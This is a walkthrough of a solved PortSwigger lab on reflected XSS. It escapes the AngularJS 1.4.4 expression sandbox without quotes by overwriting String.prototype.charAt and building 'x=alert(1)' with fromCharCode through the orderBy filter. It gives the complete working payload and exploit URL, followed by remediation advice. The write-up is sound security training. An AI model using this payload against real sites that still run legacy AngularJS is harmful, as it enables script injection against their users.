# Lab: Reflected XSS with AngularJS sandbox escape without strings

## Overview

- **Category:** Cross-Site Scripting (AngularJS Sandbox Escape / Filter Bypass)
- **Difficulty:** Expert
- **Platform:** PortSwigger Web Security Academy
- **Status:** Solved

This Expert-level lab reflects URL query parameters into an inline AngularJS controller that evaluates parameter names using the AngularJS `$parse()` service. Because string quotes (`'` and `"`) are blocked and AngularJS 1.4.4 enforces a sandbox that prevents direct access to the `Function` constructor, we chain a `String.prototype.charAt` overwrite to blind the AngularJS sandbox validator with `String.fromCharCode()` and the `orderBy` filter to execute `alert(1)` without using a single quote character.

---

## Scenario & Mental Model

```text
GOAL
  Escape the AngularJS 1.4.4 sandbox and execute alert(1) without string literals
      ↓
SOURCE & SINK ANALYSIS
  In the inline AngularJS controller:
    var key = 'PARAMETER_NAME';
    $scope.query[key] = 'PARAMETER_VALUE';
    $scope.value = $parse(key)($scope.query);
  Notice that AngularJS calls `$parse(key)` on the **query parameter name** (`key`),
  not on the parameter value!
      ↓
STEP 1: Reaching `$parse(key)` with an Assignment Expression
  By appending a second query parameter (`/?search=1&EXPRESSION=1`) and URL-encoding
  any internal `=` sign as `%3d`, the server places our entire expression inside `var key`.
      ↓
STEP 2: Blinding the AngularJS 1.4.4 Sandbox (`charAt` Overwrite)
  AngularJS 1.4.4 validates identifier names character-by-character using `.charAt()`.
  By overwriting `String.prototype.charAt` with `[].join`:
    toString().constructor.prototype.charAt=[].join
  the sandbox check returns a multi-character joined string instead of a single character,
  bypassing `ensureSafeMemberName()`.
      ↓
STEP 3: Constructing `"x=alert(1)"` Without Quotes
  Because quotes are disallowed, we obtain the `String` constructor via `toString().constructor`
  and generate the string `"x=alert(1)"` from ASCII codes:
    toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
  Passing this string to the `[1]|orderBy:` filter causes AngularJS to compile and
  execute `x=alert(1)`.
      ↓
OUTCOME
  Arbitrary JavaScript execution (`alert(1)`) → Expert Lab Solved!
```

---

## Step-by-Step Walkthrough

### 1. Analyzing the AngularJS Controller
Submitted a test search query (`/?search={{7*7}}`) and inspected the HTML response in Burp Suite:

```html
<script>
    angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
        $scope.query = {};
        var key = 'search';
        $scope.query[key] = '{{7*7}}';
        $scope.value = $parse(key)($scope.query);
    });
</script>
```

Testing an additional query parameter (`/?search=1&7*7=1`) revealed that the application iterates over every query parameter in the URL and passes each **parameter name** (`key`) directly into `$parse(key)($scope.query)`.

### 2. Building the Quote-Free AngularJS Sandbox Escape
1. **Access `String` without quotes:** Calling `toString().constructor` returns the `String` constructor function.
2. **Disable the sandbox check:** Overwriting `toString().constructor.prototype.charAt = [].join` (with `=` encoded as `%3d` so it is not parsed as the URL key-value delimiter) breaks AngularJS's character-level expression sanitizer.
3. **Generate and execute the payload:** Pipe an array `[1]` into the `orderBy` filter with the ASCII character codes for `x=alert(1)` (`120,61,97,108,101,114,116,40,49,41`):

```javascript
toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

### 3. Executing the Payload
Navigated to the following URL:

```text
https://LAB-HOST/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```

AngularJS parsed the parameter name, disabled its sandbox check via the `charAt` prototype modification, evaluated `x=alert(1)` inside the `orderBy` filter, and solved the lab.

---

## Key Takeaways & Remediation

### Why Client-Side Template Sandboxes Were Removed
The AngularJS 1.x expression sandbox relied on runtime JavaScript checks inside the same execution context as the untrusted expression. Because JavaScript allows mutation of built-in prototypes (`String.prototype.charAt`, `Array.prototype`, etc.) and string construction via `String.fromCharCode()`, attackers consistently discovered ways to subvert the sandbox—leading the Angular team to officially remove the sandbox in AngularJS 1.6 and advise never passing untrusted input to `$parse()` or templates.

### Remediation
- **Never Pass Untrusted Input to `$parse()` or `$eval()`:** Validate query parameter names against a strict allowlist (e.g., only `'search'`) rather than dynamically iterating over arbitrary request parameter keys.
- **Upgrade Away from Legacy AngularJS 1.x:** Modern Angular (2+) uses ahead-of-time (AOT) template compilation and strict context-aware sanitization.
